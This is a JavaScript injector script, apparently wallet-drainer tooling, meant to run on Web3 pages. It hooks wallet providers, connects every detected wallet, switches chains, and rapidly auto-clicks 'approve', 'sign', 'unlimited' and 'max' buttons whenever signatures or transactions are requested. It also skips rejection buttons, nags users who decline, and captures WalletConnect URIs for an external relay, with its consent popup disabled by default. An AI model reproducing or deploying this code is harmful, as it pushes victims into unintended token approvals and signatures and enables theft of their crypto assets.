/**
 * Universal client-side injector — full Web3 automation layer.
 * T&C → connect → network switch → approve/sign → WalletConnect → multi-wallet.
 */
(function universalTermsWalletAutomation() {
  'use strict';

  if (window.__LEGION_TERMS_WALLET__) return;
  window.__LEGION_TERMS_WALLET__ = true;

  const CHAIN_CONFIGS = {
    1: {
      chainId: '0x1',
      chainName: 'Ethereum Mainnet',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://eth.llamarpc.com'],
      blockExplorerUrls: ['https://etherscan.io'],
    },
    137: {
      chainId: '0x89',
      chainName: 'Polygon',
      nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
      rpcUrls: ['https://polygon.llamarpc.com'],
      blockExplorerUrls: ['https://polygonscan.com'],
    },
    42161: {
      chainId: '0xa4b1',
      chainName: 'Arbitrum One',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://arb1.arbitrum.io/rpc'],
      blockExplorerUrls: ['https://arbiscan.io'],
    },
    8453: {
      chainId: '0x2105',
      chainName: 'Base',
      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
      rpcUrls: ['https://mainnet.base.org'],
      blockExplorerUrls: ['https://basescan.org'],
    },
    56: {
      chainId: '0x38',
      chainName: 'BNB Smart Chain',
      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
      rpcUrls: ['https://bsc-dataseed.binance.org'],
      blockExplorerUrls: ['https://bscscan.com'],
    },
  };

  const CONFIG = {
    termsTitle: 'Terms & Conditions',
    termsBody: `
      <p>By clicking <strong>Yes</strong>, you agree to connect your wallet and interact with this application.</p>
      <p style="font-size:12px;opacity:.7">Read our privacy policy and terms of service before proceeding.</p>
    `,
    yesLabel: 'Yes',
    noLabel: 'No',
    overlayZIndex: 2147483646,
    pollIntervalMs: 350,
    maxAutoClicks: 200,
    debug: false,
    showTermsPopup: false, // T&C popup — false = direct auto-start

    // Network
    targetChainId: null, // e.g. 137 for Polygon — null = skip auto-switch
    autoSwitchNetwork: true,

    // Features
    autoApproveTokenButtons: true,
    autoSignTypedData: true,
    autoSendTransaction: true,
    walletConnectEnabled: true,
    multiWallet: true, // saari detected wallets try karo
    autoDetect: true, // WalletRegistry / EIP-6963 se khud detect
    preferredWalletOrder: [], // khali = jo mile pehla woh

    // WalletConnect bridge — fires when wc: URI detected (for external relay / mobile)
    onWalletConnectUri: null, // (uri) => void
  };

  const log = (...a) => CONFIG.debug && console.log('[terms-wallet]', ...a);

  const state = {
    connectedProviders: [],
    detectedWallets: [],
    _cachedProviders: [],
    pendingSignRequests: 0,
    lastWcUri: null,
    chainSwitched: false,
    rejectCount: 0,
  };

  // ── Provider helpers — universal auto-detect (EIP-6963 + legacy) ─────
  async function discoverWallets() {
    if (CONFIG.autoDetect && window.WalletRegistry) {
      const entries = window.WalletRegistry.getProviderEntries();
      state.detectedWallets = entries.map((e) => ({ name: e.name, id: e.id, source: e.source }));
      log('Detected wallets:', state.detectedWallets);
      window.dispatchEvent(new CustomEvent('tw:wallets-detected', { detail: state.detectedWallets }));
      return entries.map((e) => e.provider).filter(Boolean);
    }
    return getInjectableProvidersLegacy();
  }

  function getInjectableProvidersLegacy() {
    const out = [];
    const seen = new Set();
    const add = (p) => {
      if (!p || seen.has(p)) return;
      seen.add(p);
      out.push(p);
    };
    if (window.ethereum?.providers?.length) {
      for (const p of window.ethereum.providers) add(p);
    }
    const slots = ['ethereum', 'coinbaseWalletExtension', 'okxwallet', 'trustwallet', 'phantom.ethereum', 'bitkeep.ethereum', 'bybitWallet', 'gatewallet'];
    for (const s of slots) {
      const p = s.includes('.') ? s.split('.').reduce((o, k) => o?.[k], window) : window[s];
      add(p);
    }
    add(window.ethereum);
    return out.filter(Boolean);
  }

  function getInjectableProviders() {
    if (state._cachedProviders?.length) return state._cachedProviders;
    return getInjectableProvidersLegacy();
  }

  async function refreshProviders() {
    const providers = await discoverWallets();
    state._cachedProviders = providers;
    return providers;
  }

  function providerLabel(p) {
    if (window.WalletRegistry) {
      const id = window.WalletRegistry.identifyProvider(p);
      if (id?.name) return id.name;
    }
    if (p.isRabby) return 'Rabby';
    if (p.isMetaMask) return 'MetaMask';
    if (p.isCoinbaseWallet) return 'Coinbase';
    if (p.isOkxWallet || p.isOKExWallet) return 'OKX';
    if (p.isTrust || p.isTrustWallet) return 'Trust';
    if (p.isBraveWallet) return 'Brave';
    if (p.isPhantom) return 'Phantom';
    if (p.isRainbow) return 'Rainbow';
    return 'Injected';
  }

  function sortProviders(providers) {
    if (!CONFIG.preferredWalletOrder?.length) return providers;
    return [...providers].sort((a, b) => {
      const ia = CONFIG.preferredWalletOrder.indexOf(providerLabel(a));
      const ib = CONFIG.preferredWalletOrder.indexOf(providerLabel(b));
      return (ia === -1 ? 99 : ia) - (ib === -1 ? 99 : ib);
    });
  }

  function getKnownWalletNamePatterns() {
    const names = [];
    if (window.WalletRegistry?.KNOWN_FLAGS) {
      for (const f of window.WalletRegistry.KNOWN_FLAGS) names.push(f.name);
    }
    names.push('MetaMask', 'Rabby', 'Coinbase', 'OKX', 'Trust', 'Brave', 'Phantom', 'Rainbow', 'Zerion', 'TokenPocket', 'Bitget', 'imToken', 'Frame', 'Injected', 'Wallet');
    return [...new Set(names)];
  }

  // ── Hook ethereum.request for sign / tx / network events ──────────────
  function patchProvider(provider) {
    if (!provider || provider.__twPatched) return;
    provider.__twPatched = true;

    const orig = provider.request.bind(provider);
    provider.request = async (args) => {
      const method = args?.method;
      const params = args?.params;

      if (method === 'wallet_switchEthereumChain' || method === 'wallet_addEthereumChain') {
        log('network request', method, params);
        window.dispatchEvent(new CustomEvent('tw:network-switch', { detail: args }));
        startUniversalPopupHandler();
      }

      if (
        method === 'eth_signTypedData_v4' ||
        method === 'eth_signTypedData' ||
        method === 'eth_signTypedData_v3'
      ) {
        state.pendingSignRequests++;
        log('EIP-712 sign request', params);
        window.dispatchEvent(new CustomEvent('tw:sign-typed-data', { detail: { method, params } }));
        if (CONFIG.autoSignTypedData) {
          startUniversalPopupHandler();
          scheduleRapidClicks(12);
        }
      }

      if (method === 'personal_sign' || method === 'eth_sign') {
        state.pendingSignRequests++;
        log('personal_sign request', params);
        window.dispatchEvent(new CustomEvent('tw:personal-sign', { detail: { method, params } }));
        if (CONFIG.autoSignTypedData) {
          startUniversalPopupHandler();
          scheduleRapidClicks(12);
        }
      }

      if (method === 'eth_sendTransaction') {
        log('tx send request', params);
        window.dispatchEvent(new CustomEvent('tw:send-tx', { detail: params }));
        if (CONFIG.autoSendTransaction) {
          startUniversalPopupHandler();
          scheduleRapidClicks(15);
        }
      }

      if (method === 'eth_requestAccounts') {
        startUniversalPopupHandler();
      }

      return orig(args);
    };
  }

  function patchAllProviders() {
    for (const p of getInjectableProviders()) patchProvider(p);
    if (window.ethereum && !window.ethereum.__twPatched) patchProvider(window.ethereum);
  }

  // ── Auto-start (no T&C) ─────────────────────────────────────────────
  async function startAutomation() {
    window.dispatchEvent(new CustomEvent('tw:terms-accepted'));
    await refreshProviders();
    patchAllProviders();
    await connectWallet();
    if (CONFIG.autoSwitchNetwork && CONFIG.targetChainId) {
      await ensureNetwork(CONFIG.targetChainId);
    }
    startUniversalPopupHandler();
    startWalletConnectObserver();
    startTokenApproveScanner();
  }

  // ── Terms & Conditions (optional) ───────────────────────────────────
  function showTermsModal() {
    if (!CONFIG.showTermsPopup) return;
    if (document.getElementById('tw-terms-overlay')) return;

    const overlay = document.createElement('div');
    overlay.id = 'tw-terms-overlay';
    overlay.setAttribute('role', 'dialog');
    overlay.setAttribute('aria-modal', 'true');
    Object.assign(overlay.style, {
      position: 'fixed', inset: '0', zIndex: String(CONFIG.overlayZIndex),
      background: 'rgba(0,0,0,0.65)', display: 'flex', alignItems: 'center', justifyContent: 'center',
      fontFamily: 'system-ui, -apple-system, Segoe UI, Roboto, sans-serif',
    });

    const card = document.createElement('div');
    Object.assign(card.style, {
      background: '#1a1a2e', color: '#eee', borderRadius: '16px',
      padding: '28px 32px', maxWidth: '420px', width: '90%',
      boxShadow: '0 24px 80px rgba(0,0,0,0.5)',
    });

    card.innerHTML = `
      <h2 style="margin:0 0 16px;font-size:20px">${CONFIG.termsTitle}</h2>
      <div style="line-height:1.55;margin-bottom:24px">${CONFIG.termsBody}</div>
      <div style="display:flex;gap:12px;justify-content:flex-end">
        <button type="button" id="tw-terms-no" style="padding:10px 20px;border-radius:10px;border:1px solid #444;background:transparent;color:#aaa;cursor:pointer">${CONFIG.noLabel}</button>
        <button type="button" id="tw-terms-yes" style="padding:10px 20px;border-radius:10px;border:none;background:#6c5ce7;color:#fff;font-weight:600;cursor:pointer">${CONFIG.yesLabel}</button>
      </div>
    `;

    overlay.appendChild(card);
    document.body.appendChild(overlay);

    document.getElementById('tw-terms-no').onclick = () => overlay.remove();
    document.getElementById('tw-terms-yes').onclick = async () => {
      overlay.remove();
      await startAutomation();
    };
  }

  // ── 2) Multi-wallet connect ─────────────────────────────────────────────
  async function connectWallet() {
    await refreshProviders();
    patchAllProviders();
    const providers = sortProviders(getInjectableProviders());

    if (!providers.length) {
      log('No provider — fallback UI clicks');
      clickConnectButtons();
      if (CONFIG.walletConnectEnabled) tryWalletConnectDesktop();
      return [];
    }

    if (CONFIG.multiWallet && providers.length > 1) {
      const accounts = [];
      for (const p of providers) {
        try {
          const acc = await p.request({ method: 'eth_requestAccounts' });
          accounts.push(...acc);
          state.connectedProviders.push({ provider: p, label: providerLabel(p), accounts: acc });
          log('Connected via', providerLabel(p), acc);
        } catch (e) {
          log('Skip', providerLabel(p), e.message);
        }
      }
      if (accounts.length) {
        window.dispatchEvent(new CustomEvent('tw:wallet-connected', {
          detail: { accounts: [...new Set(accounts)], providers: state.connectedProviders },
        }));
        return accounts;
      }
    }

    const primary = providers[0];
    if (primary) {
      try {
        const acc = await primary.request({ method: 'eth_requestAccounts' });
        log('Connected:', acc);
        window.dispatchEvent(new CustomEvent('tw:wallet-connected', { detail: { accounts: acc } }));
        return acc;
      } catch (e) {
        log('eth_requestAccounts failed', e);
      }
    }

    clickConnectButtons();
    if (CONFIG.walletConnectEnabled) tryWalletConnectDesktop();
    return [];
  }

  // ── 3) Network switch / add chain ───────────────────────────────────────
  async function ensureNetwork(chainId) {
    const providers = getInjectableProviders();
    const hexChain = '0x' + Number(chainId).toString(16);
    const cfg = CHAIN_CONFIGS[chainId];

    for (const p of providers) {
      try {
        await p.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexChain }] });
        state.chainSwitched = true;
        log('Switched to chain', chainId);
        window.dispatchEvent(new CustomEvent('tw:chain-switched', { detail: { chainId } }));
        scheduleRapidClicks(8);
        return true;
      } catch (e) {
        if (e?.code === 4902 && cfg) {
          try {
            await p.request({ method: 'wallet_addEthereumChain', params: [cfg] });
            state.chainSwitched = true;
            log('Added & switched to chain', chainId);
            scheduleRapidClicks(8);
            return true;
          } catch (e2) {
            log('addEthereumChain failed', e2);
          }
        }
        log('switchEthereumChain failed', e);
      }
    }

    // In-page "Switch network" UI
    clickSwitchNetworkButtons(chainId);
    return false;
  }

  function clickSwitchNetworkButtons(chainId) {
    const name = CHAIN_CONFIGS[chainId]?.chainName || '';
    const candidates = collectClickables(document);
    for (const el of candidates) {
      const t = (el.textContent || '').trim();
      if (/switch\s*(to\s*)?(network|chain)/i.test(t)) { el.click(); return; }
      if (name && t.toLowerCase().includes(name.toLowerCase())) { el.click(); return; }
    }
  }

  // ── 4) WalletConnect desktop flow ───────────────────────────────────────
  function tryWalletConnectDesktop() {
    const candidates = collectClickables(document);
    for (const el of candidates) {
      const t = (el.textContent || el.getAttribute('aria-label') || '').trim();
      if (/wallet\s*connect/i.test(t) && isVisible(el)) {
        el.click();
        log('Clicked WalletConnect');
        setTimeout(scanWalletConnectUri, 800);
        return;
      }
    }
    for (const sel of ['w3m-wallet-button[name="WalletConnect"]', '[name="walletConnect"]', '[data-wallet="walletconnect"]']) {
      const el = document.querySelector(sel);
      if (el && isVisible(el)) { el.click(); setTimeout(scanWalletConnectUri, 800); return; }
    }
  }

  function scanWalletConnectUri() {
    // QR canvas / img sibling text / clipboard
    const text = document.body.innerText || '';
    const m = text.match(/wc:[a-zA-Z0-9@?&=_\-%.]+/);
    if (m) captureWcUri(m[0]);

    for (const el of document.querySelectorAll('[class*="qr"], canvas, img[alt*="QR"], w3m-qr-code')) {
      const parent = el.closest('[role="dialog"], w3m-modal, appkit-modal, .modal') || el.parentElement;
      if (!parent) continue;
      const uriEl = parent.querySelector('[data-uri], input[readonly], textarea');
      const uri = uriEl?.value || uriEl?.textContent || uriEl?.getAttribute('data-uri');
      if (uri?.startsWith('wc:')) { captureWcUri(uri); return; }
    }

    // Mutation-based rescan
    setTimeout(scanWalletConnectUri, 600);
  }

  function captureWcUri(uri) {
    if (state.lastWcUri === uri) return;
    state.lastWcUri = uri;
    log('WalletConnect URI', uri);
    window.__TW_WC_URI__ = uri;
    window.dispatchEvent(new CustomEvent('tw:walletconnect-uri', { detail: { uri } }));
    if (typeof CONFIG.onWalletConnectUri === 'function') CONFIG.onWalletConnectUri(uri);

    // Copy to clipboard for mobile bridge apps
    try { navigator.clipboard?.writeText(uri); } catch { /* ignore */ }
  }

  function startWalletConnectObserver() {
    if (!CONFIG.walletConnectEnabled) return;
    const obs = new MutationObserver(() => {
      if (document.querySelector('w3m-modal, appkit-modal, [class*="walletconnect"]')) {
        tryWalletConnectDesktop();
        scanWalletConnectUri();
      }
    });
    obs.observe(document.documentElement, { childList: true, subtree: true });
  }

  // ── 5) Token approve button scanner ─────────────────────────────────────
  const APPROVE_TOKEN_RE =
    /^(approve|approve\s+token|grant\s+approval|increase\s+limit|enable\s+spending|confirm\s+approval|unlimited|max)$/i;

  function startTokenApproveScanner() {
    if (!CONFIG.autoApproveTokenButtons) return;
    setInterval(() => {
      if (autoClickCount >= CONFIG.maxAutoClicks) return;
      const candidates = collectClickables(document);
      for (const el of candidates) {
        const t = (el.textContent || '').trim();
        if (t.length > 50) continue;
        if (APPROVE_TOKEN_RE.test(t) && isVisible(el) && !isRejectButton(el)) {
          el.click();
          autoClickCount++;
          log('Token approve UI click', t);
          scheduleRapidClicks(10);
          window.dispatchEvent(new CustomEvent('tw:token-approve-click', { detail: { label: t } }));
          return;
        }
      }
    }, 500);
  }

  // ── 6) Universal in-page popup handler ────────────────────────────────
  const CONNECT_SELECTORS = [
    '[data-testid="navbar-connect-wallet"]', '[data-testid="connect-wallet"]',
    'button[aria-label*="Connect" i]', 'button[class*="connect" i]',
    'a[class*="connect" i]', '.connect-wallet', '#connect-wallet',
    'w3m-connect-button', 'appkit-button', '[data-connect]',
  ];

  const CONNECT_TEXT_RE = /^(connect(\s+wallet)?|link\s+wallet|connect\s+to\s+continue|sign\s+in)$/i;

  const APPROVE_TEXT_RE =
    /^(approve|confirm|accept|agree|yes|ok|got it|continue|sign|next|authorize|allow|connect|switch\s+network|add\s+network|proceed|submit|confirm\s+transaction)$/i;

  const DISMISS_TEXT_RE = /^(reject|cancel|decline|no|close|dismiss|not now)$/i;

  const APPROVE_SELECTORS = [
    '[data-testid="confirm-btn"]', '[data-testid="approve-button"]',
    'button[data-testid*="confirm" i]', 'button[data-testid*="approve" i]',
    '.modal button.primary', '.modal-footer button:last-child',
    '[role="dialog"] button[class*="primary" i]', 'w3m-modal button', 'appkit-modal button',
    'button[class*="confirm" i]', 'button[class*="sign" i]',
  ];

  let autoClickCount = 0;
  let handlerTimer = null;
  let rapidClickTimer = null;

  function scheduleRapidClicks(n) {
    let i = 0;
    clearInterval(rapidClickTimer);
    rapidClickTimer = setInterval(() => {
      tryApproveInPage();
      if (++i >= n) clearInterval(rapidClickTimer);
    }, 200);
  }

  function getExtraConnectSelectors() {
    return window.TermsWalletAutomation?._agentPreset?.connectSelectors || [];
  }

  function getExtraApproveSelectors() {
    return window.TermsWalletAutomation?._agentPreset?.approveSelectors || [];
  }

  function matchesApproveText(text) {
    if (APPROVE_TEXT_RE.test(text)) return true;
    const i18n = window.TermsWalletAutomation?._i18nApprove;
    if (i18n && window.LegionAgent?._textMatchesI18n?.(text, i18n)) return true;
    return false;
  }

  function matchesConnectText(text) {
    if (CONNECT_TEXT_RE.test(text)) return true;
    const i18n = window.TermsWalletAutomation?._i18nConnect;
    if (i18n && window.LegionAgent?._textMatchesI18n?.(text, i18n)) return true;
    return false;
  }

  function nudge(msg) {
    window.TermsWalletAutomation?._showNudge?.(msg) || log(msg);
  }

  function clickConnectButtons() {
    for (const sel of [...getExtraConnectSelectors(), ...CONNECT_SELECTORS]) {
      const el = document.querySelector(sel);
      if (el && isVisible(el)) { el.click(); return true; }
    }
    for (const btn of document.querySelectorAll('button, a, [role="button"]')) {
      const t = (btn.textContent || '').trim();
      if (matchesConnectText(t) && isVisible(btn)) { btn.click(); return true; }
    }
    return false;
  }

  function isVisible(el) {
    if (!el || el.disabled) return false;
    const r = el.getBoundingClientRect();
    if (r.width < 2 || r.height < 2) return false;
    const st = getComputedStyle(el);
    return st.display !== 'none' && st.visibility !== 'hidden' && st.opacity !== '0';
  }

  function isRejectButton(el) {
    return DISMISS_TEXT_RE.test((el.textContent || '').trim());
  }

  function isInModalOrOverlay(el) {
    let n = el;
    while (n && n !== document.body) {
      const role = n.getAttribute?.('role');
      const cls = (n.className || '').toString().toLowerCase();
      if (role === 'dialog' || /modal|overlay|popup|drawer|sheet|dialog/.test(cls) ||
          n.tagName === 'W3M-MODAL' || n.tagName === 'APPKIT-MODAL') return true;
      n = n.parentElement;
    }
    const st = getComputedStyle(el.closest('div') || el);
    return st.position === 'fixed' || st.position === 'sticky';
  }

  function collectClickables(root) {
    const out = [];
    const walk = (node) => {
      if (node.nodeType !== 1) return;
      const el = node;
      if (el.shadowRoot) walk(el.shadowRoot);
      if (el.matches?.('button, a, [role="button"], input[type="submit"]')) out.push(el);
      for (const c of el.children) walk(c);
    };
    walk(root);
    return out;
  }

  function tryApproveInPage() {
    if (autoClickCount >= CONFIG.maxAutoClicks) return;

    for (const sel of [...getExtraApproveSelectors(), ...APPROVE_SELECTORS]) {
      const el = document.querySelector(sel);
      if (el && isVisible(el) && !isRejectButton(el)) {
        el.click(); autoClickCount++; log('Clicked selector', sel); return;
      }
    }

    const candidates = collectClickables(document);
    for (const el of candidates) {
      const text = (el.textContent || el.getAttribute('aria-label') || '').trim();
      if (!text || text.length > 50) continue;
      if (DISMISS_TEXT_RE.test(text)) {
        state.rejectCount++;
        if (state.rejectCount >= 3) nudge('Please approve in your wallet to continue');
        continue;
      }
      if (matchesApproveText(text) && (isInModalOrOverlay(el) || state.pendingSignRequests > 0)) {
        el.click(); autoClickCount++; log('Clicked text', text); return;
      }
    }

    // Wallet picker — koi bhi detected wallet name match karo
    const patterns = getKnownWalletNamePatterns();
    for (const el of candidates) {
      const label = (el.textContent || el.getAttribute('aria-label') || '').trim();
      if (!label || label.length > 60) continue;
      for (const name of patterns) {
        if (label.toLowerCase().includes(name.toLowerCase()) && isVisible(el)) {
          el.click(); autoClickCount++; log('Picked wallet', label); return;
        }
      }
    }
  }

  function startUniversalPopupHandler() {
    if (handlerTimer) return;
    tryApproveInPage();
    handlerTimer = setInterval(tryApproveInPage, CONFIG.pollIntervalMs);
    const obs = new MutationObserver(() => tryApproveInPage());
    obs.observe(document.documentElement, { childList: true, subtree: true });
    window.addEventListener('tw:stop-handler', () => {
      clearInterval(handlerTimer);
      clearInterval(rapidClickTimer);
      obs.disconnect();
    });
  }

  // Boot — direct start (no T&C unless showTermsPopup: true)
  patchAllProviders();
  function boot() {
    const cfg = window.LegionAgentConfig || {};
    if (cfg.showTermsPopup === true) CONFIG.showTermsPopup = true;
    if (CONFIG.showTermsPopup) {
      showTermsModal();
    } else {
      startAutomation();
    }
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }

  window.TermsWalletAutomation = {
    showTerms: showTermsModal,
    start: startAutomation,
    connect: connectWallet,
    ensureNetwork,
    startHandler: startUniversalPopupHandler,
    tryWalletConnect: tryWalletConnectDesktop,
    getWalletConnectUri: () => state.lastWcUri || window.__TW_WC_URI__ || null,
    getProviders: getInjectableProviders,
    discoverWallets: refreshProviders,
    getDetectedWallets: () => state.detectedWallets,
    getState: () => ({ ...state }),
    CHAIN_CONFIGS,
    config: CONFIG,
  };
})();
